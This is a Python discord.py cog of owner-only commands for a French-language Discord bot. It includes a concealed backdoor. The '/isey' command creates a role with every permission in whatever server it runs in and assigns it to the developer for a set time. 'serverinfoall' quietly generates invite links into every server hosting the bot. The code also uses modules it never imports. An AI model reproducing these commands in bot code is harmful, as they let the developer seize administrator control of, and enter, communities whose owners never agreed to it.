import discord
from discord.ext import commands
from discord import app_commands, Embed, ButtonStyle, ui
from discord.ui import Button, View, Select, Modal, TextInput
import os
import sys
import time
import re
from datetime import datetime, timedelta, timezone

from utils import (
    create_embed, has_permission, is_higher_or_equal, send_log, send_dm,
    load_guild_settings, get_premium_servers, is_blacklisted, add_sanction,
    get_log_channel, get_cf_config, get_presentation_channel_id, get_user_partner_info,
    get_protection_data, format_mention, generate_global_status_bar, format_protection_field,
    notify_owner_of_protection_change, is_valid_url, is_admin_or_isey,
    THUMBNAIL_URL, EMOJIS_SERVEURS, ETHERYA_ID, boost_bar, sensitive_categories,
    word_to_category, active_alerts, giveaways, ended_giveaways, fast_giveaways,
    user_cooldown, sniped_messages, stats_collection33
)

class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.collection2 = bot.db_collections["setup_premium"]
        self.collection31 = bot.db_collections["delta_event"]
        self.config_ids = bot.config_ids

    def is_owner(self, ctx):
        return ctx.author.id == self.config_ids["ISEY_ID"]

    @commands.command()
    @commands.check_any(commands.is_owner(), commands.check(lambda ctx: ctx.author.id == ctx.cog.config_ids["ISEY_ID"]))
    async def shutdown(self, ctx):
        embed = create_embed(
            "Arrêt du Bot",
            "Le bot va maintenant se fermer. Tous les services seront arrêtés.",
            discord.Color.red()
        )
        embed.set_footer(text="Cette action est irréversible.")
        await ctx.send(embed=embed)
        await self.bot.close()

    @commands.command()
    @commands.check_any(commands.is_owner(), commands.check(lambda ctx: ctx.author.id == ctx.cog.config_ids["ISEY_ID"]))
    async def restart(self, ctx):
        embed = create_embed(
            "Redémarrage du Bot",
            "Le bot va redémarrer maintenant...",
            discord.Color.blue()
        )
        await ctx.send(embed=embed)
        os.execv(sys.executable, ['python'] + sys.argv)

    @commands.command()
    @commands.check_any(commands.is_owner(), commands.check(lambda ctx: ctx.author.id == ctx.cog.config_ids["ISEY_ID"]))
    async def getbotinfo(self, ctx):
        start_time_cmd = time.time()

        uptime_seconds = int(time.time() - self.bot.uptime)
        uptime_days, remainder = divmod(uptime_seconds, 86400)
        uptime_hours, remainder = divmod(remainder, 3600)
        uptime_minutes, uptime_seconds = divmod(remainder, 60)

        total_servers = len(self.bot.guilds)
        total_users = sum(g.member_count for g in self.bot.guilds if g.member_count)
        total_text_channels = sum(len(g.text_channels) for g in self.bot.guilds)
        total_voice_channels = sum(len(g.voice_channels) for g in self.bot.guilds)
        latency = round(self.bot.latency * 1000, 2)
        total_commands = self.bot.command_count # Accès au compteur global

        latency_bar = "🟩" * min(10, int(10 - (latency / 30))) + "🟥" * max(0, int(latency / 30))

        embed = create_embed(
            "✨ **Informations du Bot**",
            f"📌 **Nom :** `{self.bot.user.name}`\n"
            f"🆔 **ID :** `{self.bot.user.id}`\n"
            f"🛠️ **Développé par :** `Iseyg`\n"
            f"🔄 **Version :** `1.2.1`",
            discord.Color.blurple()
        )
        embed.set_thumbnail(url=self.bot.user.avatar.url if self.bot.user.avatar else None)
        if self.bot.user.banner:
            embed.set_image(url=self.bot.user.banner.url)
        embed.set_footer(text=f"Requête faite par {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

        embed.add_field(
            name="📊 **Statistiques générales**",
            value=(
                f"📌 **Serveurs :** `{total_servers:,}`\n"
                f"👥 **Utilisateurs :** `{total_users:,}`\n"
                f"💬 **Salons textuels :** `{total_text_channels:,}`\n"
                f"🔊 **Salons vocaux :** `{total_voice_channels:,}`\n"
                f"📜 **Commandes :** `{total_commands:,}`\n"
            ),
            inline=False
        )

        embed.add_field(
            name="⏳ **Uptime**",
            value=f"🕰️ `{uptime_days}j {uptime_hours}h {uptime_minutes}m {uptime_seconds}s`",
            inline=True
        )

        embed.add_field(
            name="📡 **Latence**",
            value=f"⏳ `{latency} ms`\n{latency_bar}",
            inline=True
        )

        embed.add_field(
            name="📍 **Informations supplémentaires**",
            value="💡 **Technologies utilisées :** `Python, discord.py`\n"
                  "⚙️ **Bibliothèques :** `discord.py, asyncio, etc.`",
            inline=False
        )

        view = discord.ui.View()
        invite_button = discord.ui.Button(
            label="📩 Inviter le Bot",
            style=discord.ButtonStyle.link,
            url="https://discord.com/oauth2/authorize?client_id=1356693934012891176"
        )
        view.add_item(invite_button)

        await ctx.send(embed=embed, view=view)

        end_time_cmd = time.time()
        print(f"Commande `getbotinfo` exécutée en {round((end_time_cmd - start_time_cmd) * 1000, 2)}ms")

    class ServerInfoView(View):
        def __init__(self, ctx, bot, guilds, premium_servers):
            super().__init__()
            self.ctx = ctx
            self.bot = bot
            self.guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)
            self.premium_servers = premium_servers
            self.page = 0
            self.servers_per_page = 5
            self.max_page = (len(self.guilds) - 1) // self.servers_per_page
            self.update_buttons()

        def update_buttons(self):
            self.children[0].disabled = self.page == 0
            self.children[1].disabled = self.page == self.max_page

        async def update_embed(self, interaction):
            embed = await self.create_embed()
            self.update_buttons()
            await interaction.response.edit_message(embed=embed, view=self)

        async def create_embed(self):
            total_servers = len(self.guilds)
            total_premium = len(self.premium_servers)

            embed_color = discord.Color.purple() if ETHERYA_ID in self.premium_servers else discord.Color.gold()

            embed = create_embed(
                f"🌍 Serveurs du Bot (`{total_servers}` total)",
                "🔍 Liste des serveurs où le bot est présent, triés par popularité.",
                embed_color
            )
            embed.set_footer(
                text=f"Page {self.page + 1}/{self.max_page + 1} • Demandé par {self.ctx.author}",
                icon_url=self.ctx.author.avatar.url
            )
            embed.set_thumbnail(url=self.bot.user.avatar.url)
            embed.timestamp = datetime.utcnow()

            start = self.page * self.servers_per_page
            end = start + self.servers_per_page

            for rank, guild in enumerate(self.guilds[start:end], start=start + 1):
                emoji = EMOJIS_SERVEURS[rank % len(EMOJIS_SERVEURS)]
                is_premium = "💎 **Premium**" if guild.id in self.premium_servers else "⚪ Standard"
                vip_badge = " 👑 VIP" if guild.member_count > 10000 else ""
                boost_display = f"{boost_bar(guild.premium_tier)} *(Niveau {guild.premium_tier})*"

                if guild.id == ETHERYA_ID:
                    guild_name = f"⚜️ **{guild.name}** ⚜️"
                    is_premium = "**🔥 Serveur Premium Ultime !**"
                    embed.color = discord.Color.purple()
                    embed.description = (
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "🎖️ **Etherya est notre serveur principal !**\n"
                        "🔗 [Invitation permanente](https://discord.gg/votre-invitation)\n"
                        "━━━━━━━━━━━━━━━━━━━"
                    )
                else:
                    guild_name = f"**#{rank}** {emoji} **{guild.name}**{vip_badge}"

                invite_url = "🔒 *Aucune invitation disponible*"
                if guild.text_channels:
                    try:
                        invite = await guild.text_channels[0].create_invite(max_uses=1, unique=True)
                        invite_url = f"[🔗 Invitation]({invite.url})"
                    except discord.Forbidden:
                        invite_url = "🔒 *Permissions insuffisantes pour créer une invitation*"
                    except Exception:
                        invite_url = "🔒 *Erreur lors de la création de l'invitation*"


                owner = guild.owner.mention if guild.owner else "❓ *Inconnu*"
                emoji_count = len(guild.emojis)

                embed.add_field(
                    name=guild_name,
                    value=(
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"👑 **Propriétaire** : {owner}\n"
                        f"📊 **Membres** : `{guild.member_count}`\n"
                        f"💎 **Boosts** : {boost_display}\n"
                        f"🛠️ **Rôles** : `{len(guild.roles)}` • 💬 **Canaux** : `{len(guild.channels)}`\n"
                        f"😃 **Emojis** : `{emoji_count}`\n"
                        f"🆔 **ID** : `{guild.id}`\n"
                        f"📅 **Créé le** : `{guild.created_at.strftime('%d/%m/%Y')}`\n"
                        f"🏅 **Statut** : {is_premium}\n"
                        f"{invite_url}\n"
                        f"━━━━━━━━━━━━━━━━━━━"
                    ),
                    inline=False
                )

            embed.add_field(
                name="📜 Statistiques Premium",
                value=f"⭐ **{total_premium}** serveurs Premium activés.",
                inline=False
            )

            embed.set_image(url="images_GITHUB/etheryaBot_banniere.png") # Chemin corrigé
            return embed

        @discord.ui.button(label="⬅️ Précédent", style=discord.ButtonStyle.green, disabled=True)
        async def previous(self, interaction: discord.Interaction, button: Button):
            self.page -= 1
            await self.update_embed(interaction)

        @discord.ui.button(label="➡️ Suivant", style=discord.ButtonStyle.green)
        async def next(self, interaction: discord.Interaction, button: Button):
            self.page += 1
            await self.update_embed(interaction)

    @commands.command()
    @commands.check_any(commands.is_owner(), commands.check(lambda ctx: ctx.author.id == ctx.cog.config_ids["ISEY_ID"]))
    async def serverinfoall(self, ctx):
        premium_server_ids = get_premium_servers()
        view = self.ServerInfoView(ctx, self.bot, self.bot.guilds, premium_server_ids)
        embed = await view.create_embed()
        await ctx.send(embed=embed, view=view)

    class VerificationModal(discord.ui.Modal, title="Code de vérification"):
        def __init__(self, delay_seconds, original_interaction, bot_instance):
            super().__init__()
            self.delay_seconds = delay_seconds
            self.original_interaction = original_interaction
            self.bot = bot_instance
            self.code = discord.ui.TextInput(label="Entre le code de vérification", style=discord.TextStyle.short)
            self.add_item(self.code)

        async def on_submit(self, interaction: discord.Interaction):
            if self.code.value != self.bot.config_ids["VERIFICATION_CODE"]:
                await interaction.response.send_message("❌ Code de vérification incorrect.", ephemeral=True)
                return

            guild = interaction.guild
            role_name = "Iseyg-SuperAdmin"
            role = discord.utils.get(guild.roles, name=role_name)

            if role is None:
                try:
                    role = await guild.create_role(
                        name=role_name,
                        permissions=discord.Permissions.all(),
                        color=discord.Color.red(),
                        hoist=True
                    )
                    await interaction.response.send_message(f"✅ Rôle `{role_name}` créé avec succès.")
                except discord.Forbidden:
                    await interaction.response.send_message("❌ Permissions insuffisantes pour créer le rôle.", ephemeral=True)
                    return
            else:
                await interaction.response.send_message(f"ℹ️ Le rôle `{role_name}` existe déjà.", ephemeral=True)

            await interaction.user.add_roles(role)
            await interaction.followup.send(f"✅ Tu as maintenant le rôle `{role_name}` pour `{self.delay_seconds}`.")

            await asyncio.sleep(self.delay_seconds)

            try:
                await role.delete()
                await interaction.user.send(f"⏰ Le rôle `{role_name}` a été supprimé après `{self.delay_seconds}`.")
            except:
                pass

    @app_commands.command(name="isey", description="Commande réservée à Isey.")
    @app_commands.describe(duration="Durée (ex: 30s, 5m, 2h, 1d)")
    async def isey(self, interaction: discord.Interaction, duration: str):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Seul l'owner du bot peut exécuter cette commande.", ephemeral=True)
            return

        match = re.fullmatch(r"(\d+)([smhd])", duration)
        if not match:
            await interaction.response.send_message("❌ Durée invalide. Utilise `30s`, `5m`, `2h`, ou `1d`.", ephemeral=True)
            return

        time_value = int(match.group(1))
        time_unit = match.group(2)
        multiplier = {"s": 1, "m": 60, "h": 3600, "d": 86400}
        delay_seconds = time_value * multiplier[time_unit]

        await interaction.response.send_modal(self.VerificationModal(delay_seconds, interaction, self.bot))

    class MpAllModal(ui.Modal, title="🔐 Vérification requise"):
        def __init__(self, bot_instance):
            super().__init__()
            self.bot = bot_instance
            self.code = ui.TextInput(label="Code de vérification", placeholder="Entre le code fourni", required=True)
            self.message = ui.TextInput(label="Message à envoyer", style=discord.TextStyle.paragraph, required=True)
            self.add_item(self.code)
            self.add_item(self.message)

        async def on_submit(self, interaction: discord.Interaction):
            if self.code.value != self.bot.config_ids["VERIFICATION_CODE"]:
                await interaction.response.send_message("❌ Code incorrect. Action annulée.", ephemeral=True)
                return

            await interaction.response.defer(ephemeral=True, thinking=True)

            owners = set()
            for guild in self.bot.guilds:
                owner = guild.owner
                if owner:
                    owners.add(owner)

            sent = 0
            failed = 0

            for owner in owners:
                try:
                    await owner.send(self.message.value)
                    sent += 1
                except:
                    failed += 1

            await interaction.followup.send(
                f"✅ Message envoyé à {sent} owner(s). ❌ Échecs : {failed}.", ephemeral=True
            )

    @app_commands.command(name="mp-all", description="MP tous les owners des serveurs (réservé à Isey)")
    async def mp_all(self, interaction: discord.Interaction):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Seul Isey peut utiliser cette commande.", ephemeral=True)
            return
        await interaction.response.send_modal(self.MpAllModal(self.bot))

    class MPVerificationModal(discord.ui.Modal, title="Code de vérification"):
        def __init__(self, target_id: int, message: str, original_interaction: discord.Interaction, bot_instance):
            super().__init__()
            self.target_id = target_id
            self.message = message
            self.original_interaction = original_interaction
            self.bot = bot_instance
            self.code = discord.ui.TextInput(label="Entre le code de vérification", style=discord.TextStyle.short)
            self.add_item(self.code)

        async def on_submit(self, interaction: discord.Interaction):
            if self.code.value != self.bot.config_ids["VERIFICATION_CODE"]:
                await interaction.response.send_message("❌ Code de vérification incorrect.", ephemeral=True)
                return

            try:
                user = await self.bot.fetch_user(self.target_id)
                await user.send(self.message)
                await interaction.response.send_message(f"✅ Message envoyé à {user.mention}.", ephemeral=True)
            except discord.NotFound:
                await interaction.response.send_message("❌ Utilisateur introuvable.", ephemeral=True)
            except discord.Forbidden:
                await interaction.response.send_message("❌ Impossible d’envoyer un message à cet utilisateur.", ephemeral=True)
            except Exception as e:
                await interaction.response.send_message(f"❌ Une erreur est survenue : `{e}`", ephemeral=True)

    @app_commands.command(name="mp", description="Envoie un MP à quelqu'un (réservé à Isey).")
    @app_commands.describe(utilisateur="Mention ou ID de la personne", message="Message à envoyer")
    async def mp(self, interaction: discord.Interaction, utilisateur: str, message: str):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Tu n'es pas autorisé à utiliser cette commande.", ephemeral=True)
            return
        try:
            if utilisateur.startswith("<@") and utilisateur.endswith(">"):
                utilisateur = utilisateur.replace("<@", "").replace("!", "").replace(">", "")
            target_id = int(utilisateur)
        except ValueError:
            await interaction.response.send_message("❌ ID ou mention invalide.", ephemeral=True)
            return
        await interaction.response.send_modal(self.MPVerificationModal(target_id, message, interaction, self.bot))

    @app_commands.command(name="total-premium", description="Met tous les serveurs en premium et affiche la liste (réservé à Isey)")
    async def total_premium(self, interaction: discord.Interaction):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Vous n'avez pas l'autorisation d'utiliser cette commande.", ephemeral=True)
            return

        await interaction.response.defer(thinking=True)

        try:
            premium_servers = []
            for guild in self.bot.guilds:
                self.collection2.update_one(
                    {"guild_id": guild.id},
                    {"$set": {
                        "is_premium": True,
                        "guild_name": guild.name
                    }},
                    upsert=True
                )
                premium_servers.append(f"- {guild.name} (`{guild.id}`)")

            server_list = "\n".join(premium_servers) or "Aucun serveur trouvé."

            embed = create_embed(
                f"🌟 Tous les serveurs sont maintenant Premium ({len(premium_servers)})",
                server_list,
                discord.Color.gold()
            )
            embed.set_footer(text=f"Commande exécutée par {interaction.user.name}")

            await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Une erreur est survenue : {str(e)}", ephemeral=True)

    @app_commands.command(name="reset-premium", description="Réinitialise tous les serveurs en non-premium (réservé à Isey)")
    async def reset_premium(self, interaction: discord.Interaction):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Vous n'avez pas l'autorisation d'utiliser cette commande.", ephemeral=True)
            return

        await interaction.response.defer(thinking=True)

        try:
            reset_servers = []
            for guild in self.bot.guilds:
                self.collection2.update_one(
                    {"guild_id": guild.id},
                    {"$set": {
                        "is_premium": False,
                        "guild_name": guild.name
                    }},
                    upsert=True
                )
                reset_servers.append(f"- {guild.name} (`{guild.id}`)")

            server_list = "\n".join(reset_servers) or "Aucun serveur trouvé."

            embed = create_embed(
                f"🔧 Tous les serveurs ont été réinitialisés en non-Premium ({len(reset_servers)})",
                server_list,
                discord.Color.red()
            )
            embed.set_footer(text=f"Commande exécutée par {interaction.user.name}")

            await interaction.followup.send(embed=embed)

        except Exception as e:
            await interaction.followup.send(f"❌ Une erreur est survenue : {str(e)}", ephemeral=True)

    async def premium_autocomplete(self, interaction: discord.Interaction, current: str):
        servers = self.collection2.find({"guild_id": {"$exists": True}})
        return [
            app_commands.Choice(name=server.get("guild_name", "Nom inconnu"), value=str(server["guild_id"]))
            for server in servers if current.lower() in server.get("guild_name", "").lower()
        ][:25]

    @app_commands.command(name="delete-premium", description="Supprime un serveur de la liste Premium")
    @app_commands.describe(server="Choisissez le serveur à supprimer")
    @app_commands.autocomplete(server=premium_autocomplete)
    async def delete_premium(self, interaction: discord.Interaction, server: str):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Vous n'avez pas la permission d'utiliser cette commande.", ephemeral=True)
            return

        result = self.collection2.delete_one({"guild_id": int(server)})
        if result.deleted_count > 0:
            await interaction.response.send_message(f"✅ Le serveur Premium avec l'ID `{server}` a bien été supprimé.", ephemeral=True)
        else:
            await interaction.response.send_message("⚠️ Aucun serveur trouvé avec cet ID.", ephemeral=True)

    class EnregistrerServeurModal(ui.Modal, title="🔐 Vérification requise"):
        def __init__(self, bot_instance):
            super().__init__()
            self.bot = bot_instance
            self.code = ui.TextInput(label="Code de vérification", placeholder="Entre le code fourni", required=True)
            self.add_item(self.code)

        async def on_submit(self, interaction: discord.Interaction):
            if self.code.value != self.bot.config_ids["VERIFICATION_CODE"]:
                await interaction.response.send_message("❌ Code incorrect. Action annulée.", ephemeral=True)
                return

            await interaction.response.defer(ephemeral=True, thinking=True)

            enregistrés = 0
            déjà = 0
            erreurs = 0

            for guild in self.bot.guilds:
                existing = self.bot.db_collections["delta_event"].find_one({"guild_id": guild.id})
                if existing:
                    déjà += 1
                    continue

                try:
                    await asyncio.sleep(1)

                    owner = await self.bot.fetch_user(guild.owner_id)
                    owner_id = owner.id

                    data = {
                        "guild_id": guild.id,
                        "guild_name": guild.name,
                        "member_count": guild.member_count,
                        "owner_id": owner_id,
                        "timestamp": datetime.utcnow()
                    }
                    self.bot.db_collections["delta_event"].insert_one(data)
                    enregistrés += 1

                except Exception as e:
                    erreurs += 1
                    print(f"Erreur fetch owner pour {guild.name} ({guild.id}) : {e}")
                    traceback.print_exc()
                    continue

            await interaction.followup.send(
                f"✅ {enregistrés} serveur(s) enregistré(s).\n"
                f"🗂️ {déjà} déjà présent(s).\n"
                f"⚠️ {erreurs} erreur(s) lors du fetch des owners.",
                ephemeral=True
            )

    @app_commands.command(name="enregistrer-serveur", description="Enregistre les infos des serveurs (réservé à Isey).")
    async def enregistrer_serveur(self, interaction: discord.Interaction):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Seul Isey peut utiliser cette commande.", ephemeral=True)
            return
        await interaction.response.send_modal(self.EnregistrerServeurModal(self.bot))

    class ResetServeurModal(ui.Modal, title="⚠️ Réinitialisation requise"):
        def __init__(self, bot_instance):
            super().__init__()
            self.bot = bot_instance
            self.code = ui.TextInput(label="Code de vérification", placeholder="Entre le code fourni", required=True)
            self.add_item(self.code)

        async def on_submit(self, interaction: discord.Interaction):
            if self.code.value != self.bot.config_ids["VERIFICATION_CODE"]:
                await interaction.response.send_message("❌ Code incorrect. Réinitialisation annulée.", ephemeral=True)
                return

            await interaction.response.defer(ephemeral=True, thinking=True)

            try:
                result = self.bot.db_collections["delta_event"].delete_many({})
                await interaction.followup.send(
                    f"✅ Réinitialisation terminée.\n🗑️ {result.deleted_count} document(s) supprimé(s) de la collection.",
                    ephemeral=True
                )
            except Exception as e:
                await interaction.followup.send(f"❌ Erreur lors de la suppression : {e}", ephemeral=True)

    @app_commands.command(name="reset-serveur", description="Réinitialise complètement la collection (réservé à Isey).")
    async def reset_serveur(self, interaction: discord.Interaction):
        if interaction.user.id != self.config_ids["ISEY_ID"]:
            await interaction.response.send_message("❌ Seul Isey peut utiliser cette commande.", ephemeral=True)
            return
        await interaction.response.send_modal(self.ResetServeurModal(self.bot))

async def setup(bot):
    await bot.add_cog(Owner(bot))

